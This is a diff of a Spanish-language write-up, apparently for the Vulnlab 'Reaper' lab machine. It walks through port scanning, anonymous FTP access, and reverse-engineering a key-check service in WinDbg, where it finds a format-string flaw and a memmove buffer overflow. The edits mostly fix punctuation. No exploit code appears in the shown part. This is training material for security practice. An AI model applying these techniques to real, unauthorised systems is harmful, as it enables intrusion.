@@ -145,10 +145,10 @@
 <section class="post" id="enumeration">
 <br><h3 class="post-title">Enumeración</h3><br>
 
-<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">21</code> que corre un servicio <code class="language-plaintext highlighter-rouge">ftp</code></p>
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">21</code> que corre un servicio <code class="language-plaintext highlighter-rouge">ftp</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ nmap </span><span class="p">10.10.122.10
-Nmap scan report for 10.10.122.10  
+Nmap scan report for 10.10.122.10
 PORT     STATE SERVICE
 21/tcp   open  ftp
 80/tcp   open  http
@@ -157,40 +157,40 @@ PORT     STATE SERVICE
 5357/tcp open  wsdapi</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Esta abierto el puerto <code class="language-plaintext highlighter-rouge">80</code> con un servicio <code class="language-plaintext highlighter-rouge">http</code> sin embargo si lo abrimos la web en el navegador nos muestra simplemente la página que viene por defecto en los <code class="language-plaintext highlighter-rouge">IIS</code></p>
+<p class="plain-text">Está abierto el puerto <code class="language-plaintext highlighter-rouge">80</code> con un servicio <code class="language-plaintext highlighter-rouge">http</code> sin embargo si lo abrimos la web en el navegador nos muestra simplemente la página que viene por defecto en los <code class="language-plaintext highlighter-rouge">IIS</code>.</p>
 <a href="/vulnlab/reaper/0.png" target="_blank"><div><p><img src="/vulnlab/reaper/0.png"></p></div></a>
 
-<p class="plain-text">Ya que esta abierto iniciaremos por conectarnos a <code class="language-plaintext highlighter-rouge">ftp</code>, en este caso admite la autenticacion por defecto del usuario <code class="language-plaintext highlighter-rouge">anonymous</code> sin proporcionar contraseña</p>
+<p class="plain-text">Ya que está abierto iniciaremos por conectarnos a <code class="language-plaintext highlighter-rouge">ftp</code>, en este caso admite la autenticación por defecto del usuario <code class="language-plaintext highlighter-rouge">anonymous</code> sin proporcionar contraseña.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ftp</span><span class="p"> 10.10.122.10
 Connected to 10.10.122.10.
 220 Microsoft FTP Service
 Name (10.10.122.10:user): anonymous
-331 Anonymous access allowed, send identity (e-mail name) as password.  
+331 Anonymous access allowed, send identity (e-mail name) as password.
 Password:
 230 User logged in.
 Remote system type is Windows_NT.
 ftp></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Dentro encontramos <code class="language-plaintext highlighter-rouge">2</code> archivos, un archivo <code class="language-plaintext highlighter-rouge">.exe</code> y un <code class="language-plaintext highlighter-rouge">.txt</code>, descargamos ambos</p>
+<p class="plain-text">Dentro encontramos <code class="language-plaintext highlighter-rouge">2</code> archivos, un archivo <code class="language-plaintext highlighter-rouge">.exe</code> y un <code class="language-plaintext highlighter-rouge">.txt</code>, descargamos ambos.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">ftp> dir
 229 Entering Extended Passive Mode (|||5005|)
-125 Data connection already open; Transfer starting.   
+125 Data connection already open; Transfer starting.
 08-14-23  11:12PM                  262 dev_keys.txt
 08-14-23  01:53PM               187392 dev_keysvc.exe
 226 Transfer complete.
 ftp></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al ejecutar el binario muestra que se ha iniciado un servidor en el puerto <code class="language-plaintext highlighter-rouge">4141</code></p>
+<p class="plain-text">Al ejecutar el binario muestra que se ha iniciado un servidor en el puerto <code class="language-plaintext highlighter-rouge">4141</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">PS C:\Users\user\Desktop></span><span class="am"> .\dev_keysvc.exe</span><span class="p">  
+<code><span class="p">PS C:\Users\user\Desktop></span><span class="am"> .\dev_keysvc.exe</span><span class="p">
 Server listening on port 4141</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Además del binario se nos otorga un archivo <code class="language-plaintext highlighter-rouge">.txt</code> que contiene algunas keys las cuales parece que son para alguna funcionalidad que aun se encuentra en desarrollo</p>
+<p class="plain-text">Además del binario se nos otorga un archivo <code class="language-plaintext highlighter-rouge">.txt</code> que contiene algunas keys las cuales parece que son para alguna funcionalidad que aun se encuentra en desarrollo.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ cat </span><span class="p">dev_keys.txt
 Development Keys:
@@ -199,10 +199,10 @@ Development Keys:
 101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl
 102-FE9A1-500-A272-0106-UHJlbWl1bSBMaWNlbnNl
 
-The dev keys can not be activated yet, we are working on fixing a bug in the activation function.  </span>
+The dev keys can not be activated yet, we are working on fixing a bug in the activation function.</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al conectarnos con <code class="language-plaintext highlighter-rouge">netcat</code> al puerto <code class="language-plaintext highlighter-rouge">4141</code> podemos ver un menú de opciones, la opción <code class="language-plaintext highlighter-rouge">1</code> pide una key, al introducir una de las del <code class="language-plaintext highlighter-rouge">.txt</code> nos devuelve que es un formato valido, la opción <code class="language-plaintext highlighter-rouge">2</code> muestra <code class="language-plaintext highlighter-rouge">23</code> bytes de la key y un comentario interesante</p>
+<p class="plain-text">Al conectarnos con <code class="language-plaintext highlighter-rouge">netcat</code> al puerto <code class="language-plaintext highlighter-rouge">4141</code> podemos ver un menú de opciones, la opción <code class="language-plaintext highlighter-rouge">1</code> pide una key, al introducir una de las del <code class="language-plaintext highlighter-rouge">.txt</code> nos devuelve que es un formato válido, la opción <code class="language-plaintext highlighter-rouge">2</code> muestra <code class="language-plaintext highlighter-rouge">23</code> bytes de la key y un comentario interesante.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ netcat </span><span class="p">192.168.100.5 4141  
 Choose an option:
@@ -217,7 +217,7 @@ Choose an option:
 2. Activate key
 3. Exit
 2
-Checking key: 100-FE9A1-500-A270-0102, Comment: Standard License  
+Checking key: 100-FE9A1-500-A270-0102, Comment: Standard License
 Could not find key!
 Choose an option:
 1. Set key
@@ -225,9 +225,9 @@ Choose an option:
 3. Exit</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El comentario de la opción <code class="language-plaintext highlighter-rouge">2</code> proviene de la data en base64 después de <code class="language-plaintext highlighter-rouge">24</code> bytes</p>
+<p class="plain-text">El comentario de la opción <code class="language-plaintext highlighter-rouge">2</code> proviene de la data en base64 después de <code class="language-plaintext highlighter-rouge">24</code> bytes.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ echo</span><span class="p"> U3RhbmRhcmQgTGljZW5zZQ== | </span><span class="ve">base64</span><span class="p"> -d  
+<code><span class="ve">❯ echo</span><span class="p"> U3RhbmRhcmQgTGljZW5zZQ== | </span><span class="ve">base64</span><span class="p"> -d
 Standard License</span>
 </code></pre></div></div><br>
 
@@ -236,65 +236,55 @@ Standard License</span>
 <section class="post" id="shell-keysvc">
 <br><h3 class="post-title">Shell - keysvc</h3><br>
 
-<p class="plain-text">Para poder depurar el programa facilmente abriremos la aplicación dentro de <code class="language-plaintext highlighter-rouge">WinDbg</code></p>
+<p class="plain-text">Para poder depurar el programa fácilmente abriremos la aplicación dentro de <code class="language-plaintext highlighter-rouge">WinDbg</code>.</p>
 <a href="/vulnlab/reaper/1.png" target="_blank"><div><p><img src="/vulnlab/reaper/1.png"></p></div></a>
 
-<p class="plain-text">Si miramos los detalles del módulo podemos ver que contienes las protecciones <code class="language-plaintext highlighter-rouge">DEP</code> y <code class="language-plaintext highlighter-rouge">ASLR</code>, el primero impide que podamos ejecutar un shellcode en el stack, el segundo indica que la dirección base del binario deberia cambiar después de cada reinicio</p>
+<p class="plain-text">Si miramos los detalles del módulo podemos ver que contiene las protecciones <code class="language-plaintext highlighter-rouge">DEP</code> y <code class="language-plaintext highlighter-rouge">ASLR</code>, el primero impide que podamos ejecutar un shellcode en el stack, el segundo indica que la dirección base del binario deberia cambiar después de cada reinicio.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">0:000> </span><span class="p">!py mona modules
-Hold on...
-[+] Command used:
-!py C:\Users\user\Documents\WinDbgX\amd64\mona.py modules
+<code><span class="ve">❯ ropper</span><span class="p"> --file dev_keysvc.exe --dllcharacteristics
 
-[+] Processing arguments and criteria
-    - Pointer access level : X
-[+] Generating module info table, hang on...
-    - Processing modules
-    - Done. Let's rock 'n roll.
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
- Module info :
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
- Base               | Top                | Size               | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Modulename & Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
- 0x00007ffdf23b0000 | 0x00007ffdf2767000 | 0x00000000003b7000 | True   | True    | True  | True  |  True    | True   | [KERNELBASE.dll] (C:\Windows\System32\KERNELBASE.dll) 
- 0x00007ffdf1300000 | 0x00007ffdf1369000 | 0x0000000000069000 | True   | True    | True  | True  |  True    | True   | [mswsock.dll] (C:\Windows\system32\mswsock.dll)
- 0x00007ff651920000 | 0x00007ff651953000 | 0x0000000000033000 | True   | True    | True  | False |  True    | False  | [dev_keysvc.exe] (ReaperKeyCheck.exe)
- 0x00007ffdf3c60000 | 0x00007ffdf3d24000 | 0x00000000000c4000 | True   | True    | True  | True  |  True    | True   | [KERNEL32.DLL] (C:\Windows\System32\KERNEL32.DLL)
- 0x00007ffdf4b30000 | 0x00007ffdf4d47000 | 0x0000000000217000 | True   | True    | True  | True  |  True    | True   | [ntdll.dll] (ntdll.dll)
- 0x00007ffdf4810000 | 0x00007ffdf4924000 | 0x0000000000114000 | True   | True    | True  | True  |  True    | True   | [RPCRT4.dll] (C:\Windows\System32\RPCRT4.dll)
- 0x00007ffdf4740000 | 0x00007ffdf47b1000 | 0x0000000000071000 | True   | True    | True  | True  |  True    | True   | [WS2_32.dll] (C:\Windows\System32\WS2_32.dll)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
+DllCharacteristics
+==================
 
-[+] Preparing output file 'modules.txt'
-    - (Re)setting logfile C:\mona\modules.txt</span>
+Name                 Value
+----                 -----
+</span><span class="az">DynamicBase</span><span class="am">          Yes
+</span><span class="az">ForceIntegrity</span><span class="ve">       NO
+</span><span class="az">NxCompat</span><span class="am">             Yes
+</span><span class="az">No Isolation</span><span class="ve">         NO
+</span><span class="az">No SEH</span><span class="ve">               NO
+</span><span class="az">No Bind</span><span class="ve">              NO
+</span><span class="az">WdmDriver</span><span class="ve">            NO
+</span><span class="az">ControlFLowGuard</span><span class="ve">     NO
+</span><span class="az">TerminalServerAware</span><span class="am">  Yes</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">main</code> inicia llamando a la función <code class="language-plaintext highlighter-rouge">WSAStartup</code> para inicializar winsock y luego llama a la función <code class="language-plaintext highlighter-rouge">socket</code> para crear un socket y este devuelve un descriptor</p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">main</code> inicia llamando a la función <code class="language-plaintext highlighter-rouge">WSAStartup</code> para inicializar winsock y luego llama a la función <code class="language-plaintext highlighter-rouge">socket</code> para crear un socket y este devuelve un descriptor.</p>
 <a href="/vulnlab/reaper/2.png" target="_blank"><div><p><img src="/vulnlab/reaper/2.png"></p></div></a>
 
-<p class="plain-text">Luego utiliza <code class="language-plaintext highlighter-rouge">htons</code> para darle formato al puerto <code class="language-plaintext highlighter-rouge">4141</code> y posteriormente llamar a <code class="language-plaintext highlighter-rouge">bind</code> y <code class="language-plaintext highlighter-rouge">listen</code> para ponerse en escucha de conexiones entrantes en ese puerto</p>
+<p class="plain-text">Luego utiliza <code class="language-plaintext highlighter-rouge">htons</code> para darle formato al puerto <code class="language-plaintext highlighter-rouge">4141</code> y posteriormente llamar a <code class="language-plaintext highlighter-rouge">bind</code> y <code class="language-plaintext highlighter-rouge">listen</code> para ponerse en escucha de conexiones entrantes en ese puerto.</p>
 <a href="/vulnlab/reaper/3.png" target="_blank"><div><p><img src="/vulnlab/reaper/3.png"></p></div></a>
 
-<p class="plain-text">Luego de llamar a <code class="language-plaintext highlighter-rouge">accept</code> si sale bien llama a la función <code class="language-plaintext highlighter-rouge">beginthreadex</code> para crear un hilo por cada conexión que ejecuta la función <code class="language-plaintext highlighter-rouge">StartAddress</code> pasandole el descriptor</p>
+<p class="plain-text">Luego de llamar a <code class="language-plaintext highlighter-rouge">accept</code> si sale bien llama a la función <code class="language-plaintext highlighter-rouge">beginthreadex</code> para crear un hilo por cada conexión que ejecuta la función <code class="language-plaintext highlighter-rouge">StartAddress</code> pasándole el descriptor.</p>
 <a href="/vulnlab/reaper/5.png" target="_blank"><div><p><img src="/vulnlab/reaper/5.png"></p></div></a>
 
-<p class="plain-text">El primer bloque de la función <code class="language-plaintext highlighter-rouge">StartAddress</code> inicia reservando algunos espacios de memoria con <code class="language-plaintext highlighter-rouge">VirtalAlloc</code>, luego de ello define una variable <code class="language-plaintext highlighter-rouge">menu</code> con una string</p>
+<p class="plain-text">El primer bloque de la función <code class="language-plaintext highlighter-rouge">StartAddress</code> inicia reservando algunos espacios de memoria con <code class="language-plaintext highlighter-rouge">VirtalAlloc</code>, luego de ello define una variable <code class="language-plaintext highlighter-rouge">menu</code> con una string.</p>
 <a href="/vulnlab/reaper/6.png" target="_blank"><div><p><img src="/vulnlab/reaper/6.png"></p></div></a>
 
-<p class="plain-text">Después llama a <code class="language-plaintext highlighter-rouge">send</code> para enviar el menú y pide un buffer de 2 bytes con <code class="language-plaintext highlighter-rouge">recv</code> para obtener una opción, la cual definirá mediante un <code class="language-plaintext highlighter-rouge">switch</code> que operaciones realizar</p>
+<p class="plain-text">Después llama a <code class="language-plaintext highlighter-rouge">send</code> para enviar el menú y pide un buffer de 2 bytes con <code class="language-plaintext highlighter-rouge">recv</code> para obtener una opción, la cual definirá mediante un <code class="language-plaintext highlighter-rouge">switch</code> que operaciones realizar.</p>
 <a href="/vulnlab/reaper/7.png" target="_blank"><div><p><img src="/vulnlab/reaper/7.png"></p></div></a>
 
-<p class="plain-text">Si la opción que se recibió es igual a la string <code class="language-plaintext highlighter-rouge">1</code> utiliza <code class="language-plaintext highlighter-rouge">recv</code> de nuevo para recibir la key, luego de ello llama a la función <code class="language-plaintext highlighter-rouge">checksum</code> que si devuelve <code class="language-plaintext highlighter-rouge">1</code> indica que la key tiene un formato válido de lo contrario inválido, esto último lo muestra con <code class="language-plaintext highlighter-rouge">send</code></p>
+<p class="plain-text">Si la opción que se recibió es igual a la string <code class="language-plaintext highlighter-rouge">1</code> utiliza <code class="language-plaintext highlighter-rouge">recv</code> de nuevo para recibir la key, luego de ello llama a la función <code class="language-plaintext highlighter-rouge">checksum</code> que si devuelve <code class="language-plaintext highlighter-rouge">1</code> indica que la key tiene un formato válido de lo contrario inválido, esto último lo muestra con <code class="language-plaintext highlighter-rouge">send</code>.</p>
 <a href="/vulnlab/reaper/8.png" target="_blank"><div><p><img src="/vulnlab/reaper/8.png"></p></div></a>
 
-<p class="plain-text">En lugar de crear una key sabemos que usando la primera key del <code class="language-plaintext highlighter-rouge">.txt</code> es válida</p>
+<p class="plain-text">En lugar de crear una key sabemos que usando la primera key del <code class="language-plaintext highlighter-rouge">.txt</code> es válida.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">Choose an option:
 1. Set key
 2. Activate key
 3. Exit
 1
-Enter a key: 100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==  
+Enter a key: 100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
 Valid key format
 Choose an option:
 1. Set key
@@ -302,48 +292,48 @@ Choose an option:
 3. Exit</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al comparar la opción con <code class="language-plaintext highlighter-rouge">2</code> llama a una función llamada <code class="language-plaintext highlighter-rouge">check</code> que si devuelve <code class="language-plaintext highlighter-rouge">1</code> encontró la key de lo contrario devuelve <code class="language-plaintext highlighter-rouge">0</code> y muestra con <code class="language-plaintext highlighter-rouge">send</code> que no se encontró</p>
+<p class="plain-text">Al comparar la opción con <code class="language-plaintext highlighter-rouge">2</code> llama a una función llamada <code class="language-plaintext highlighter-rouge">check</code> que si devuelve <code class="language-plaintext highlighter-rouge">1</code> encontró la key de lo contrario devuelve <code class="language-plaintext highlighter-rouge">0</code> y muestra con <code class="language-plaintext highlighter-rouge">send</code> que no se encontró.</p>
 <a href="/vulnlab/reaper/9.png" target="_blank"><div><p><img src="/vulnlab/reaper/9.png"></p></div></a>
 <a href="/vulnlab/reaper/10.png" target="_blank"><div><p><img src="/vulnlab/reaper/10.png"></p></div></a>
 
-<p class="plain-text">Al finalizar llena <code class="language-plaintext highlighter-rouge">0x1000</code> bytes de la variable buffer utilizando <code class="language-plaintext highlighter-rouge">0's</code> llamando a <code class="language-plaintext highlighter-rouge">memset</code></p>
+<p class="plain-text">Al finalizar llena <code class="language-plaintext highlighter-rouge">0x1000</code> bytes de la variable buffer utilizando <code class="language-plaintext highlighter-rouge">0's</code> llamando a <code class="language-plaintext highlighter-rouge">memset</code>.</p>
 <a href="/vulnlab/reaper/11.png" target="_blank"><div><p><img src="/vulnlab/reaper/11.png"></p></div></a>
 
-<p class="plain-text">Si la opción es igual a la string <code class="language-plaintext highlighter-rouge">3</code> muestra un mensaje con <code class="language-plaintext highlighter-rouge">puts</code> y sale del programa</p>
+<p class="plain-text">Si la opción es igual a la string <code class="language-plaintext highlighter-rouge">3</code> muestra un mensaje con <code class="language-plaintext highlighter-rouge">puts</code> y sale del programa.</p>
 <a href="/vulnlab/reaper/12.png" target="_blank"><div><p><img src="/vulnlab/reaper/12.png"></p></div></a>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">checksum</code> compara que la clave sea mayor o igual a <code class="language-plaintext highlighter-rouge">23</code> bytes, si es asi inicia una variable <code class="language-plaintext highlighter-rouge">csum</code> a <code class="language-plaintext highlighter-rouge">0</code> igual que un iterador llamado <code class="language-plaintext highlighter-rouge">i</code> para iniciar un bucle</p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">checksum</code> compara que la clave sea mayor o igual a <code class="language-plaintext highlighter-rouge">23</code> bytes, si es asi inicia una variable <code class="language-plaintext highlighter-rouge">csum</code> a <code class="language-plaintext highlighter-rouge">0</code> igual que un iterador llamado <code class="language-plaintext highlighter-rouge">i</code> para iniciar un bucle.</p>
 <a href="/vulnlab/reaper/13.png" target="_blank"><div><p><img src="/vulnlab/reaper/13.png"></p></div></a>
 
-<p class="plain-text">El bucle verifica que entre las posiciones <code class="language-plaintext highlighter-rouge">4</code> y <code class="language-plaintext highlighter-rouge">8</code> los caracteres sean imprimibles, osea que los bytes no sean menores o iguales a <code class="language-plaintext highlighter-rouge">0x20</code> ni mayores iguales a <code class="language-plaintext highlighter-rouge">0x7f</code></p>
+<p class="plain-text">El bucle verifica que entre las posiciones <code class="language-plaintext highlighter-rouge">4</code> y <code class="language-plaintext highlighter-rouge">8</code> los caracteres sean imprimibles, osea que los bytes no sean menores o iguales a <code class="language-plaintext highlighter-rouge">0x20</code> ni mayores iguales a <code class="language-plaintext highlighter-rouge">0x7f</code>.</p>
 <a href="/vulnlab/reaper/14.png" target="_blank"><div><p><img src="/vulnlab/reaper/14.png"></p></div></a>
 
-<p class="plain-text">La siguiente validación es que las posiciones <code class="language-plaintext highlighter-rouge">4</code>, <code class="language-plaintext highlighter-rouge">10</code>, <code class="language-plaintext highlighter-rouge">14</code> y <code class="language-plaintext highlighter-rouge">19</code> sean iguales a un <code class="language-plaintext highlighter-rouge">-</code></p>
+<p class="plain-text">La siguiente validación es que las posiciones <code class="language-plaintext highlighter-rouge">4</code>, <code class="language-plaintext highlighter-rouge">10</code>, <code class="language-plaintext highlighter-rouge">14</code> y <code class="language-plaintext highlighter-rouge">19</code> sean iguales a un <code class="language-plaintext highlighter-rouge">-</code>.</p>
 <a href="/vulnlab/reaper/15.png" target="_blank"><div><p><img src="/vulnlab/reaper/15.png"></p></div></a>
 
-<p class="plain-text">Para los caractéres antes de la posición <code class="language-plaintext highlighter-rouge">19</code> se acumula su valor <code class="language-plaintext highlighter-rouge">ascii</code> menos <code class="language-plaintext highlighter-rouge">0x30</code> o <code class="language-plaintext highlighter-rouge">0</code> en ascii, esto lo hace para comprobar que los caracteres relevantes son dígitos</p>
+<p class="plain-text">Para los caractéres antes de la posición <code class="language-plaintext highlighter-rouge">19</code> se acumula su valor <code class="language-plaintext highlighter-rouge">ascii</code> menos <code class="language-plaintext highlighter-rouge">0x30</code> o <code class="language-plaintext highlighter-rouge">0</code> en ascii, esto lo hace para comprobar que los caracteres relevantes son dígitos.</p>
 <a href="/vulnlab/reaper/16.png" target="_blank"><div><p><img src="/vulnlab/reaper/16.png"></p></div></a>
 
-<p class="plain-text">La variable <code class="language-plaintext highlighter-rouge">result</code> almacena los últimos cuadro dígitos del módulo de <code class="language-plaintext highlighter-rouge">csum % 10000</code>, luego utiliza <code class="language-plaintext highlighter-rouge">strtol</code> y <code class="language-plaintext highlighter-rouge">ckey</code> toma el valor numérico a partir del caractér <code class="language-plaintext highlighter-rouge">19</code>, osea los últimos <code class="language-plaintext highlighter-rouge">4</code> digitos de la clave, si la variable <code class="language-plaintext highlighter-rouge">result</code> es igual a <code class="language-plaintext highlighter-rouge">ckey</code> se retorna <code class="language-plaintext highlighter-rouge">1</code></p>
+<p class="plain-text">La variable <code class="language-plaintext highlighter-rouge">result</code> almacena los últimos cuadro dígitos del módulo de <code class="language-plaintext highlighter-rouge">csum % 10000</code>, luego utiliza <code class="language-plaintext highlighter-rouge">strtol</code> y <code class="language-plaintext highlighter-rouge">ckey</code> toma el valor numérico a partir del caractér <code class="language-plaintext highlighter-rouge">19</code>, osea los últimos <code class="language-plaintext highlighter-rouge">4</code> digitos de la clave, si la variable <code class="language-plaintext highlighter-rouge">result</code> es igual a <code class="language-plaintext highlighter-rouge">ckey</code> se retorna <code class="language-plaintext highlighter-rouge">1</code>.</p>
 <a href="/vulnlab/reaper/17.png" target="_blank"><div><p><img src="/vulnlab/reaper/17.png"></p></div></a>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">check</code> llama a una función llamada <code class="language-plaintext highlighter-rouge">checking</code> pasandole la key y abre un archivo <code class="language-plaintext highlighter-rouge">keys.txt</code> con <code class="language-plaintext highlighter-rouge">fopen</code>, si sale bien inicializa una variable <code class="language-plaintext highlighter-rouge">found</code> en <code class="language-plaintext highlighter-rouge">0</code></p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">check</code> llama a una función llamada <code class="language-plaintext highlighter-rouge">checking</code> pasandole la key y abre un archivo <code class="language-plaintext highlighter-rouge">keys.txt</code> con <code class="language-plaintext highlighter-rouge">fopen</code>, si sale bien inicializa una variable <code class="language-plaintext highlighter-rouge">found</code> en <code class="language-plaintext highlighter-rouge">0</code>.</p>
 <a href="/vulnlab/reaper/18.png" target="_blank"><div><p><img src="/vulnlab/reaper/18.png"></p></div></a>
 
-<p class="plain-text">Luego inicia un bucle en el que lee <code class="language-plaintext highlighter-rouge">0x1000</code> bytes del archivo con <code class="language-plaintext highlighter-rouge">fgets</code>, encuentra la posición del caracter <code class="language-plaintext highlighter-rouge">\n</code> y lo reemplaza por <code class="language-plaintext highlighter-rouge">\0</code>, compara que la clave <code class="language-plaintext highlighter-rouge">key</code> sea igual que la linea actual del archivo buffer, si es igual cambia el valor de <code class="language-plaintext highlighter-rouge">found</code> a <code class="language-plaintext highlighter-rouge">1</code></p>
+<p class="plain-text">Luego inicia un bucle en el que lee <code class="language-plaintext highlighter-rouge">0x1000</code> bytes del archivo con <code class="language-plaintext highlighter-rouge">fgets</code>, encuentra la posición del caracter <code class="language-plaintext highlighter-rouge">\n</code> y lo reemplaza por <code class="language-plaintext highlighter-rouge">\0</code>, compara que la clave <code class="language-plaintext highlighter-rouge">key</code> sea igual que la linea actual del archivo buffer, si es igual cambia el valor de <code class="language-plaintext highlighter-rouge">found</code> a <code class="language-plaintext highlighter-rouge">1</code>.</p>
 <a href="/vulnlab/reaper/19.png" target="_blank"><div><p><img src="/vulnlab/reaper/19.png"></p></div></a>
 
-<p class="plain-text">La función inicia guardando en la variable <code class="language-plaintext highlighter-rouge">b64</code> la dirección de key mas <code class="language-plaintext highlighter-rouge">0x18</code>, en esta dirección inicia la cadena en <code class="language-plaintext highlighter-rouge">base64</code>, luego llama a la función <code class="language-plaintext highlighter-rouge">base64</code> que restaura la string original, mas adelante llama a <code class="language-plaintext highlighter-rouge">vsprintf</code> para guardar al inicio del buffer la cadena <code class="language-plaintext highlighter-rouge">Checking key</code>, este buffer es el inicio de la string que se enviará</p>
+<p class="plain-text">La función inicia guardando en la variable <code class="language-plaintext highlighter-rouge">b64</code> la dirección de key mas <code class="language-plaintext highlighter-rouge">0x18</code>, en esta dirección inicia la cadena en <code class="language-plaintext highlighter-rouge">base64</code>, luego llama a la función <code class="language-plaintext highlighter-rouge">base64</code> que restaura la string original, más adelante llama a <code class="language-plaintext highlighter-rouge">vsprintf</code> para guardar al inicio del buffer la cadena <code class="language-plaintext highlighter-rouge">Checking key</code>, este buffer es el inicio de la string que se enviará.</p>
 <a href="/vulnlab/reaper/20.png" target="_blank"><div><p><img src="/vulnlab/reaper/20.png"></p></div></a>
 
-<p class="plain-text">Establecemos un breakpoint en el <code class="language-plaintext highlighter-rouge">call</code>, si enviamos la key el primer argumento apunta al buffer mas <code class="language-plaintext highlighter-rouge">24</code> bytes donde se encuentra la string en <code class="language-plaintext highlighter-rouge">base64</code>, en <code class="language-plaintext highlighter-rouge">rdx</code> se almacena la longitud de la string y finalmente en <code class="language-plaintext highlighter-rouge">r8</code> un puntero hacia el size</p>
+<p class="plain-text">Establecemos un breakpoint en el <code class="language-plaintext highlighter-rouge">call</code>, si enviamos la key el primer argumento apunta al buffer mas <code class="language-plaintext highlighter-rouge">24</code> bytes donde se encuentra la string en <code class="language-plaintext highlighter-rouge">base64</code>, en <code class="language-plaintext highlighter-rouge">rdx</code> se almacena la longitud de la string y finalmente en <code class="language-plaintext highlighter-rouge">r8</code> un puntero hacia el size.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0:000></span><span class="p"> bp ReaperKeyCheck + 0x1604
 
 </span><span class="ro">0:000></span><span class="p"> g
 Breakpoint 0 hit
 ReaperKeyCheck+0x1604:
-00007ff6`51921604 e8c7fcffff      call    ReaperKeyCheck+0x12d0 (00007ff6`519212d0)  
+00007ff6`51921604 e8c7fcffff      call    ReaperKeyCheck+0x12d0 (00007ff6`519212d0)
 
 </span><span class="ro">0:000></span><span class="p"> da rcx
 000001bb`f1f50018  "U3RhbmRhcmQgTGljZW5zZQ=="
@@ -355,30 +345,30 @@ rdx=0000000000000019
 00000086`5c8fe6b0  00000000`00000000</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">call</code> el valor de retorno en <code class="language-plaintext highlighter-rouge">rax</code> es un puntero a la cadena decodeada</p>
+<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">call</code> el valor de retorno en <code class="language-plaintext highlighter-rouge">rax</code> es un puntero a la cadena decodeada.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0:000></span><span class="p"> p
 ReaperKeyCheck+0x1609:
-00007ff6`51921609 4889442438      mov     qword ptr [rsp+38h],rax ss:00000086`5c8fe6b8=00af00ae20040125  
+00007ff6`51921609 4889442438      mov     qword ptr [rsp+38h],rax ss:00000086`5c8fe6b8=00af00ae20040125
 
 </span><span class="ro">0:000></span><span class="p"> da rax
 000001bb`f1e17950  "Standard License"</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Luego utiliza la función <code class="language-plaintext highlighter-rouge">snprintf</code> para guardar en la posición <code class="language-plaintext highlighter-rouge">14</code> del buffer lo que le pasemos como <code class="language-plaintext highlighter-rouge">key</code>, esto podria ocasionar una vulnerabilidad de tipo format string</p>
+<p class="plain-text">Luego utiliza la función <code class="language-plaintext highlighter-rouge">snprintf</code> para guardar en la posición <code class="language-plaintext highlighter-rouge">14</code> del buffer lo que le pasemos como <code class="language-plaintext highlighter-rouge">key</code>, esto podria ocasionar una vulnerabilidad de tipo format string.</p>
 <a href="/vulnlab/reaper/21.png" target="_blank"><div><p><img src="/vulnlab/reaper/21.png"></p></div></a>
 
-<p class="plain-text">Además de ello utiliza la función <code class="language-plaintext highlighter-rouge">memmove</code> para mover el contenido en base64 ya decodificado a un nuevo buffer sin sanitización ocasionando un buffer overflow</p>
+<p class="plain-text">Además de ello utiliza la función <code class="language-plaintext highlighter-rouge">memmove</code> para mover el contenido en base64 ya decodificado a un nuevo buffer sin sanitización ocasionando un buffer overflow.</p>
 <a href="/vulnlab/reaper/4.png" target="_blank"><div><p><img src="/vulnlab/reaper/4.png"></p></div></a>
 
